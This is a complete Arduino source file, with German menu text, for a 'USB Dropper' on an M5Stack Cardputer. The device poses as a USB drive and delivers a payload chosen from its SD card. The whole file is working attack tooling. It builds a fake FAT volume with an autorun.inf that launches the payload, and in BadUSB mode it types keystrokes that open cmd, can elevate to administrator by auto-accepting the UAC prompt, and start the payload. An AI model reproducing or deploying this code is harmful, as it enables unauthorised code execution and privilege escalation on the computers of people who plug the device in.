#include "usb_dropper.h"
#include "config.h"
#include "settings.h"
#include "keyboard.h"
#include "ui.h"
#include "menu.h"
#include "sd_helper.h" 
#include <Arduino.h>
#include <M5Unified.h>
#include <SD.h>
#include <USBMSC.h>
#include <USB.h>       

#undef KEY_BACKSPACE
#undef KEY_TAB
#include <USBHIDKeyboard.h>

#include <vector>
#include <SPI.h>
#include <WiFi.h>
#include <FS.h>

#define IMG_FILE_PATH     "/payload.img"
#define IMG_SIZE_SECTORS  4096      
#define BYTES_PER_SECTOR  512
#define ROOT_DIR_ENTRIES  224
#define FAT_SIZE_SECTORS  9         
#define ROOT_DIR_SECTORS  14        
#define DATA_START_SECTOR 33

static USBMSC msc;
static bool msc_active = false;
static File imgFile;
static USBHIDKeyboard dropperKb; 

static File stream_payload_file;
static uint32_t stream_total_sectors;
static uint32_t stream_fat_sectors;
static uint32_t stream_data_start_sector;
static uint32_t stream_total_clusters;
static uint32_t stream_file1_clusters;
static uint32_t stream_file2_clusters;
static String stream_autorun_data = "";

static String volume_label   = "USBDrive";
static String selected_path  = "";
static int    attack_mode    = 0;     
static int    size_mode      = 1;     
static bool   badusb_admin   = false; 

static void startUSBMSMode();

static void write16(uint8_t* buf, int pos, uint16_t val) {
    buf[pos] = val & 0xFF;
    buf[pos+1] = (val >> 8) & 0xFF;
}
static void write32(uint8_t* buf, int pos, uint32_t val) {
    buf[pos]   = val & 0xFF;
    buf[pos+1] = (val >> 8) & 0xFF;
    buf[pos+2] = (val >> 16) & 0xFF;
    buf[pos+3] = (val >> 24) & 0xFF;
}

static void setFatEntry12(uint8_t* fat, uint16_t cluster, uint16_t val) {
    uint16_t offset = cluster + (cluster / 2);
    if (cluster & 1) {
        fat[offset] = (fat[offset] & 0x0F) | ((val & 0x0F) << 4);
        fat[offset + 1] = (val >> 4) & 0xFF;
    } else {
        fat[offset] = val & 0xFF;
        fat[offset + 1] = (fat[offset + 1] & 0xF0) | ((val >> 8) & 0x0F);
    }
}

struct VirtualFile {
    String name;
    String ext;
    String fullPath;
    uint32_t size;
    bool isAutorun;
    String data;
};

static void buildBootSector12(uint8_t* sector) {
    memset(sector, 0, 512);
    sector[0] = 0xEB; sector[1] = 0x3C; sector[2] = 0x90;
    memcpy(sector+3, "MSDOS5.0", 8);
    write16(sector, 11, BYTES_PER_SECTOR);
    sector[13] = 1;
    write16(sector, 14, 1);
    sector[16] = 2;
    write16(sector, 17, ROOT_DIR_ENTRIES);
    write16(sector, 19, IMG_SIZE_SECTORS);
    sector[21] = 0xF8;
    write16(sector, 22, FAT_SIZE_SECTORS);
    write16(sector, 24, 63);
    write16(sector, 26, 255);
    write32(sector, 28, 0);
    write32(sector, 32, 0);
    sector[36] = 0x80;
    sector[38] = 0x29;
    write32(sector, 39, esp_random());
    
    String label = volume_label;
    label.toUpperCase();
    while (label.length() < 11) label += " ";
    if (label.length() > 11) label = label.substring(0, 11);
    memcpy(sector+43, label.c_str(), 11);
    
    memcpy(sector+54, "FAT12   ", 8);
    sector[510] = 0x55;
    sector[511] = 0xAA;
}

static void buildBootSector16(uint8_t* sector) {
    memset(sector, 0, 512);
    sector[0] = 0xEB; sector[1] = 0x3C; sector[2] = 0x90;
    memcpy(sector+3, "MSDOS5.0", 8);
    write16(sector, 11, BYTES_PER_SECTOR);
    sector[13] = 1; 
    write16(sector, 14, 1); 
    sector[16] = 2; 
    write16(sector, 17, 224); 
    write16(sector, 19, 0); 
    sector[21] = 0xF8; 
    write16(sector, 22, stream_fat_sectors); 
    write16(sector, 24, 63);
    write16(sector, 26, 255);
    write32(sector, 28, 0);
    write32(sector, 32, stream_total_sectors); 
    sector[36] = 0x80;
    sector[38] = 0x29;
    write32(sector, 39, esp_random());
    
    String label = volume_label;
    label.toUpperCase();
    while (label.length() < 11) label += " ";
    if (label.length() > 11) label = label.substring(0, 11);
    memcpy(sector+43, label.c_str(), 11);
    
    memcpy(sector+54, "FAT16   ", 8);
    sector[510] = 0x55;
    sector[511] = 0xAA;
}

static void buildDirEntry(uint8_t* entry, String fname, uint8_t attr, uint16_t startCluster, uint32_t fileSize) {
    memset(entry, 0, 32);
    
    String namePart = fname;
    String extPart = "";
    int dotPos = fname.lastIndexOf('.');
    if (dotPos >= 0) {
        namePart = fname.substring(0, dotPos);
        extPart = fname.substring(dotPos + 1);
    }
    
    String nameUpper = namePart;
    nameUpper.toUpperCase();
    String extUpper = extPart;
    extUpper.toUpperCase();
    
    while (nameUpper.length() < 8) nameUpper += " ";
    while (extUpper.length() < 3) extUpper += " ";
    if (nameUpper.length() > 8) nameUpper = nameUpper.substring(0, 8);
    if (extUpper.length() > 3) extUpper = extUpper.substring(0, 3);
    
    memcpy(entry, nameUpper.c_str(), 8);
    memcpy(entry+8, extUpper.c_str(), 3);
    
    entry[11] = attr;
    
    entry[12] = 0;
    bool nameLower = true;
    for (char c : namePart) { if (c >= 'A' && c <= 'Z') { nameLower = false; break; } }
    if (nameLower && namePart.length() > 0) entry[12] |= 0x08;
    
    bool extLower = true;
    for (char c : extPart) { if (c >= 'A' && c <= 'Z') { extLower = false; break; } }
    if (extLower && extPart.length() > 0) entry[12] |= 0x10;
    
    write16(entry, 14, 0x6000); 
    write16(entry, 16, 0x5741); 
    write16(entry, 18, 0x6000); 
    write16(entry, 22, 0x6000); 
    write16(entry, 24, 0x5741); 
    
    write16(entry, 26, startCluster);
    write32(entry, 28, fileSize);
}

static bool createPayloadImage2MB() {
    if (selected_path == "") {
        displayError("Keine Datei/Ordner gewaehlt", true);
        return false;
    }

    File checkFile = SD.open(selected_path);
    if (!checkFile) {
        displayError("Pfad nicht gefunden", true);
        return false;
    }
    bool isDir = checkFile.isDirectory();
    checkFile.close();

    std::vector<VirtualFile> vFiles;
    String basePath = selected_path;
    if (isDir && !basePath.endsWith("/")) basePath += "/";

    uint32_t totalSize = 0;

    if (isDir) {
        File dir = SD.open(selected_path);
        File f = dir.openNextFile();
        while (f) {
            if (!f.isDirectory()) {
                VirtualFile vf;
                String fullName = f.name();
                int lastSlash = fullName.lastIndexOf('/');
                if (lastSlash >= 0) fullName = fullName.substring(lastSlash + 1);
                
                int dotPos = fullName.lastIndexOf('.');
                if (dotPos >= 0) {
                    vf.name = fullName.substring(0, dotPos);
                    vf.ext = fullName.substring(dotPos + 1);
                } else {
                    vf.name = fullName;
                    vf.ext = "";
                }
                vf.fullPath = basePath + fullName;
                vf.size = f.size();
                vf.isAutorun = false;
                totalSize += vf.size;
                vFiles.push_back(vf);
            }
            f = dir.openNextFile();
        }
        dir.close();
    } else {
        VirtualFile vf;
        String fullName = selected_path.substring(selected_path.lastIndexOf('/') + 1);
        int dotPos = fullName.lastIndexOf('.');
        if (dotPos >= 0) {
            vf.name = fullName.substring(0, dotPos);
            vf.ext = fullName.substring(dotPos + 1);
        } else {
            vf.name = fullName;
            vf.ext = "";
        }
        vf.fullPath = selected_path;
        File f = SD.open(selected_path);
        vf.size = f.size();
        f.close();
        vf.isAutorun = false;
        totalSize += vf.size;
        vFiles.push_back(vf);
    }

    if (totalSize > 1800000) {
        displayError("Datei zu gross (max 2MB)", true);
        return false;
    }

    if (attack_mode == 0) {
        VirtualFile af;
        af.name = "autorun";
        af.ext = "inf";
        af.isAutorun = true;
        String targetExe = vFiles.empty() ? "payload.bat" : (vFiles[0].name + "." + vFiles[0].ext);
        af.data = "[autorun]\r\nopen=" + targetExe + "\r\nicon=shell32.dll,4\r\n";
        af.size = af.data.length();
        af.fullPath = "";
        vFiles.insert(vFiles.begin(), af);
    }

    if (SD.exists(IMG_FILE_PATH)) SD.remove(IMG_FILE_PATH);
    
    File wFile = SD.open(IMG_FILE_PATH, FILE_WRITE);
    if (!wFile) {
        displayError("Image-Datei Fehler", true);
        return false;
    }

    uint8_t zeroBuf[512] = {0};
    for (int i = 0; i < IMG_SIZE_SECTORS; i++) wFile.write(zeroBuf, 512);

    uint8_t* fat1 = new uint8_t[FAT_SIZE_SECTORS * 512];
    uint8_t* rootDir = new uint8_t[ROOT_DIR_SECTORS * 512];
    if (!fat1 || !rootDir) {
        displayError("Speicherfehler (Heap)", true);
        if (fat1) delete[] fat1;
        if (rootDir) delete[] rootDir;
        if (wFile) wFile.close();
        return false;
    }
    memset(fat1, 0, FAT_SIZE_SECTORS * 512);
    memset(rootDir, 0, ROOT_DIR_SECTORS * 512);

    fat1[0] = 0xF8; fat1[1] = 0xFF; fat1[2] = 0xFF;

    uint16_t currentCluster = 2;
    int entryIdx = 0;
    
    buildDirEntry(rootDir + (entryIdx * 32), volume_label, 0x08, 0, 0);
    entryIdx++;
    
    for (size_t i = 0; i < vFiles.size(); i++) {
        uint16_t startCluster = (vFiles[i].size == 0) ? 0 : currentCluster;
        buildDirEntry(rootDir + (entryIdx * 32), vFiles[i].name + "." + vFiles[i].ext, 0x20, startCluster, vFiles[i].size);
        entryIdx++;
        
        uint16_t clustersNeeded = (vFiles[i].size + 511) / 512;
        for (uint16_t c = 0; c < clustersNeeded; c++) {
            if (c == clustersNeeded - 1) setFatEntry12(fat1, currentCluster, 0xFFF);
            else { setFatEntry12(fat1, currentCluster, currentCluster + 1); currentCluster++; }
        }
        if (clustersNeeded > 0) currentCluster++;
    }

    uint8_t bootSec[512];
    buildBootSector12(bootSec);
    wFile.seek(0); wFile.write(bootSec, 512);

    wFile.seek(1 * 512); wFile.write(fat1, FAT_SIZE_SECTORS * 512);
    wFile.seek((1 + FAT_SIZE_SECTORS) * 512); wFile.write(fat1, FAT_SIZE_SECTORS * 512);
    wFile.seek((1 + 2 * FAT_SIZE_SECTORS) * 512); wFile.write(rootDir, ROOT_DIR_SECTORS * 512);

    delete[] fat1;
    delete[] rootDir;

    currentCluster = 2; 

    for (size_t i = 0; i < vFiles.size(); i++) {
        if (vFiles[i].size > 0) {
            uint32_t dataSector = DATA_START_SECTOR + (currentCluster - 2);

            if (vFiles[i].isAutorun) {
                uint8_t buf[512] = {0};
                memcpy(buf, vFiles[i].data.c_str(), vFiles[i].size);
                wFile.seek(dataSector * 512); wFile.write(buf, 512);
            } else {
                File f = SD.open(vFiles[i].fullPath);
                if (f) {
                    uint8_t buf[512];
                    int remaining = vFiles[i].size;
                    while (remaining > 0) {
                        memset(buf, 0, 512);
                        int toRead = (remaining > 512) ? 512 : remaining;
                        f.read(buf, toRead);
                        wFile.seek(dataSector * 512); wFile.write(buf, 512);
                        dataSector++;
                        remaining -= 512;
                    }
                    f.close();
                }
            }
            currentCluster += (vFiles[i].size + 511) / 512;
        }
    }

    wFile.flush();
    wFile.close();
    return true;
}

static bool prepareStreamPayload() {
    if (!kitenSdBegin()) {
        displayError("SD-Karte nicht erkannt", true);
        return false;
    }

    if (selected_path == "") {
        displayError("Keine Datei/Ordner gewaehlt", true);
        return false;
    }

    File f = SD.open(selected_path);
    if (!f) {
        displayError("Pfad nicht gefunden", true);
        return false;
    }
    if (f.isDirectory()) {
        displayError("50MB Modus: Nur Dateien!", true);
        f.close();
        return false;
    }

    uint32_t pSize = f.size();
    if (pSize > 52428800) { 
        f.close();
        displayError("Datei zu gross (max 50MB)", true);
        return false;
    }

    stream_payload_file = f; 

    stream_file2_clusters = (pSize + 511) / 512;
    if (stream_file2_clusters == 0) stream_file2_clusters = 1;

    if (attack_mode == 0) {
        String targetExe = selected_path.substring(selected_path.lastIndexOf('/') + 1);
        targetExe.toUpperCase(); 
        stream_autorun_data = "[autorun]\r\nopen=" + targetExe + "\r\nicon=shell32.dll,4\r\n";
        stream_file1_clusters = (stream_autorun_data.length() + 511) / 512;
        if (stream_file1_clusters == 0) stream_file1_clusters = 1;
    } else {
        stream_autorun_data = "";
        stream_file1_clusters = 0;
    }

    stream_total_clusters = stream_file1_clusters + stream_file2_clusters;
    stream_fat_sectors = ((stream_total_clusters + 2) * 2 + 511) / 512;
    if (stream_fat_sectors == 0) stream_fat_sectors = 1;

    stream_data_start_sector = 1 + 2 * stream_fat_sectors + 14;
    stream_total_sectors = stream_data_start_sector + stream_total_clusters;
    return true;
}

static int32_t onRead_2MB(uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {
    if (!imgFile) return 0;
    imgFile.seek(lba * 512 + offset);
    return imgFile.read((uint8_t*)buffer, bufsize);
}

static int32_t onWrite_2MB(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {
    return bufsize;
}

static int32_t onRead_50MB(uint32_t lba, uint32_t offset, void* buffer, uint32_t bufsize) {
    uint8_t* buf = (uint8_t*)buffer;
    static uint8_t tempBuf[512];
    uint8_t* target = buf;
    bool isAligned = (offset == 0 && bufsize == 512);
    if (!isAligned) target = tempBuf;

    if (lba == 0) {
        buildBootSector16(target);
    } else if (lba >= 1 && lba < 1 + stream_fat_sectors) {
        
        uint32_t start_entry = (lba - 1) * 256;
        for (int i = 0; i < 256; i++) {
            uint32_t entry = start_entry + i;
            uint16_t val = 0x0000;
            if (entry == 0) val = 0xFFF8;
            else if (entry == 1) val = 0xFFFF;
            else if (entry >= 2 && entry < stream_total_clusters + 2) {
                uint32_t file1_end = 2 + stream_file1_clusters - 1;
                uint32_t file2_end = 2 + stream_file1_clusters + stream_file2_clusters - 1;
                if (entry == file1_end || entry == file2_end) val = 0xFFFF;
                else val = entry + 1;
            }
            target[i * 2] = val & 0xFF;
            target[i * 2 + 1] = (val >> 8) & 0xFF;
        }
    } else if (lba >= 1 + stream_fat_sectors && lba < 1 + 2 * stream_fat_sectors) {
        
        uint32_t start_entry = (lba - 1 - stream_fat_sectors) * 256;
        for (int i = 0; i < 256; i++) {
            uint32_t entry = start_entry + i;
            uint16_t val = 0x0000;
            if (entry == 0) val = 0xFFF8;
            else if (entry == 1) val = 0xFFFF;
            else if (entry >= 2 && entry < stream_total_clusters + 2) {
                uint32_t file1_end = 2 + stream_file1_clusters - 1;
                uint32_t file2_end = 2 + stream_file1_clusters + stream_file2_clusters - 1;
                if (entry == file1_end || entry == file2_end) val = 0xFFFF;
                else val = entry + 1;
            }
            target[i * 2] = val & 0xFF;
            target[i * 2 + 1] = (val >> 8) & 0xFF;
        }
    } else if (lba >= 1 + 2 * stream_fat_sectors && lba < stream_data_start_sector) {
        
        memset(target, 0, 512);
        uint32_t sector_in_root = lba - (1 + 2 * stream_fat_sectors);
        if (sector_in_root == 0) {
            int entryIdx = 0;
            buildDirEntry(target + (entryIdx * 32), volume_label, 0x08, 0, 0);
            entryIdx++;
            if (attack_mode == 0 && stream_file1_clusters > 0) {
                buildDirEntry(target + (entryIdx * 32), "autorun.inf", 0x20, 2, stream_autorun_data.length());
                entryIdx++;
            }
            String fName = selected_path.substring(selected_path.lastIndexOf('/') + 1);
            uint16_t startCluster = 2;
            if (attack_mode == 0 && stream_file1_clusters > 0) startCluster = 2 + stream_file1_clusters;
            buildDirEntry(target + (entryIdx * 32), fName, 0x20, startCluster, stream_payload_file.size());
        }
    } else {
        
        uint32_t data_lba = lba - stream_data_start_sector;
        memset(target, 0, 512);
        
        if (data_lba < stream_file1_clusters) {
            uint32_t offset_in_file = data_lba * 512;
            uint32_t to_copy = stream_autorun_data.length() - offset_in_file;
            if (to_copy > 512) to_copy = 512;
            if (to_copy > 0) memcpy(target, stream_autorun_data.c_str() + offset_in_file, to_copy);
        } else {
            uint32_t payload_lba = data_lba - stream_file1_clusters;
            if (payload_lba < stream_file2_clusters) {
                stream_payload_file.seek(payload_lba * 512);
                stream_payload_file.read(target, 512);
            }
        }
    }

    if (!isAligned) memcpy(buf, target + offset, bufsize);
    return bufsize;
}

static int32_t onWrite_50MB(uint32_t lba, uint32_t offset, uint8_t* buffer, uint32_t bufsize) {
    return bufsize; 
}

static void runBadUSB() {
    delay(500); 
    
    dropperKb.press(KEY_LEFT_GUI);
    dropperKb.press('r');
    dropperKb.releaseAll();
    
    delay(250); 
    
    dropperKb.print("cmd"); 
    
    String fileName = selected_path.substring(selected_path.lastIndexOf('/') + 1);
    String safeName = fileName;
    safeName.toUpperCase();
    String cmd = "start " + volume_label + ":\\" + safeName;
    
    if (badusb_admin) {
        
        dropperKb.press(KEY_LEFT_CTRL);
        dropperKb.press(KEY_LEFT_SHIFT);
        dropperKb.press(KEY_RETURN);
        dropperKb.releaseAll();
        
        delay(1500); 
        
        
        dropperKb.press(KEY_LEFT_ALT);
        dropperKb.press('y');
        dropperKb.releaseAll();
        
        delay(300); 
        
        dropperKb.print(cmd);
        dropperKb.write(KEY_RETURN); 
    } else {
        dropperKb.write(KEY_RETURN); 
        delay(300); 
        dropperKb.print(cmd);
        dropperKb.write(KEY_RETURN); 
    }
    
    delay(300);
}

static void startUSBMSMode() {
    if (msc_active) return;
    
    bool success = false;
    if (size_mode == 0) {
        success = createPayloadImage2MB();
        if (!success) return;
        imgFile = SD.open(IMG_FILE_PATH, FILE_READ);
        if (!imgFile) { displayError("Image Lesefehler", true); return; }
        msc.onRead(onRead_2MB);
        msc.onWrite(onWrite_2MB);
    } else {
        success = prepareStreamPayload();
        if (!success) return;
        msc.onRead(onRead_50MB);
        msc.onWrite(onWrite_50MB);
    }

    msc.vendorID("M5Stack");
    msc.productID("Cardputer");
    msc.productRevision("1.0");
    msc.mediaPresent(true);
    
    if (attack_mode == 1) dropperKb.begin();
    USB.begin();
    
    uint32_t sectors = (size_mode == 0) ? IMG_SIZE_SECTORS : stream_total_sectors;
    if (!msc.begin(sectors, 512)) {
        displayError("USB-MSC Start fehlgeschlagen", true);
        if (size_mode == 0) { if (imgFile) imgFile.close(); }
        else { if (stream_payload_file) stream_payload_file.close(); }
        return;
    }
    msc_active = true;

    M5.Display.fillScreen(kitenConfig.bgColor);
    drawMainBorder(false);
    M5.Display.setTextSize(FM);
    M5.Display.setTextColor(kitenConfig.priColor, kitenConfig.bgColor);
    M5.Display.setCursor(BORDER_PAD_X, BORDER_PAD_Y);
    M5.Display.print("USB DROPPER AKTIV");
    M5.Display.drawFastHLine(BORDER_PAD_X, BORDER_PAD_Y + LH*FM + 2, SCREEN_WIDTH - 2*BORDER_PAD_X, kitenConfig.secColor);
    
    int y = BORDER_PAD_Y + LH*FM + 6;
    M5.Display.setTextSize(FP);
    M5.Display.setTextColor(TFT_WHITE, kitenConfig.bgColor);
    
    M5.Display.setCursor(BORDER_PAD_X, y); y+=LH+2;
    M5.Display.print("Laufwerk: " + volume_label + ":\\");
    
    M5.Display.setCursor(BORDER_PAD_X, y); y+=LH+2;
    M5.Display.print("Modus: " + String(attack_mode == 0 ? "Autorun" : "BadUSB"));
    
    M5.Display.setCursor(BORDER_PAD_X, y); y+=LH+2;
    String showPath = selected_path.substring(selected_path.lastIndexOf('/') + 1);
    if (showPath == "") showPath = "Keine";
    M5.Display.print("Datei: " + showPath);
    
    M5.Display.setTextColor(TFT_RED, kitenConfig.bgColor);
    M5.Display.setCursor(BORDER_PAD_X, SCREEN_HEIGHT - LH*FP - 4);
    M5.Display.print("[ESC] Beenden");

    if (attack_mode == 1) {
        delay(1500); 
        if (msc_active) runBadUSB();
    }

    while (msc_active) {
        M5.update(); 
        pollKeyboard();
        if (check(EscPress)) { 
            uiBeep(440,30); 
            waitAllKeysReleased(); 
            break; 
        }
        delay(10);
    }

    msc.end();
    if (size_mode == 0) { if (imgFile) imgFile.close(); }
    else { if (stream_payload_file) stream_payload_file.close(); }
    msc_active = false;
}

static void selectPayloadFile() {
    if (!kitenSdBegin()) {
        displayError("SD-Karte nicht erkannt", true);
        return;
    }
    
    std::vector<Option> opts;
    File dir = SD.open("/payload");
    
    if (!dir || !dir.isDirectory()) {
        displayError("/payload Ordner fehlt", true);
        SD.mkdir("/payload");
        return;
    }

    File f = dir.openNextFile();
    while (f) {
        if (!f.isDirectory()) {
            String fName = f.name();
            int lastSlash = fName.lastIndexOf('/');
            if (lastSlash >= 0) fName = fName.substring(lastSlash + 1);
            
            String fullPath = "/payload/" + fName;
            opts.push_back({fName, [fullPath](){ selected_path = fullPath; }});
        } else {
            String dName = f.name();
            int lastSlash = dName.lastIndexOf('/');
            if (lastSlash >= 0) dName = dName.substring(lastSlash + 1);
            
            String fullPath = "/payload/" + dName;
            opts.push_back({"[Ordner] " + dName, [fullPath](){ selected_path = fullPath; }});
        }
        f = dir.openNextFile();
    }
    dir.close();

    if (opts.empty()) {
        displayWarning("Keine Payloads in /payload", false);
        return;
    }

    addBackItem(opts);
    loopOptions(opts, MENU_TYPE_REGULAR, "Payload waehlen");
}

static void usbDropperSettings() {
    std::vector<Option> opts;
    
    opts.push_back({"Payload: " + (selected_path == "" ? "Keine" : selected_path.substring(selected_path.lastIndexOf('/') + 1)), [](){
        selectPayloadFile();
    }});
    
    opts.push_back({"Volume: " + volume_label, [](){
        String input = keyboard(volume_label, 11, "Laufwerksname:");
        if (input != "\x1B" && input.length() > 0) volume_label = input;
    }});
    
    opts.push_back({"Modus: " + String(attack_mode == 0 ? "Autorun" : "BadUSB"), [](){
        attack_mode = (attack_mode + 1) % 2;
    }});

    
    if (attack_mode == 1) {
        opts.push_back({"Admin Rechte: " + String(badusb_admin ? "Ja" : "Nein"), [](){
            badusb_admin = !badusb_admin;
        }});
    }

    opts.push_back({"Limit: " + String(size_mode == 0 ? "2MB (Image)" : "50MB (Stream)"), [](){
        size_mode = (size_mode + 1) % 2;
    }});
    
    opts.push_back({"USB Speicher starten", [](){
        startUSBMSMode();
    }});
    
    addBackItem(opts);
    loopOptions(opts, MENU_TYPE_REGULAR, "USB Dropper");
}

void usbDropperMenuEntry() {
    int sel = 0;
    std::vector<Option> opts;
    for (;;) {
        opts.clear();
        opts.push_back({"Payload vorbereiten/starten", [](){ startUSBMSMode(); }});
        opts.push_back({"Einstellungen", [](){ usbDropperSettings(); }});
        addBackItem(opts);
        sel = loopOptions(opts, MENU_TYPE_REGULAR, "USB Dropper");
        if (sel == -1 || sel == (int)opts.size() - 1) return;
    }
}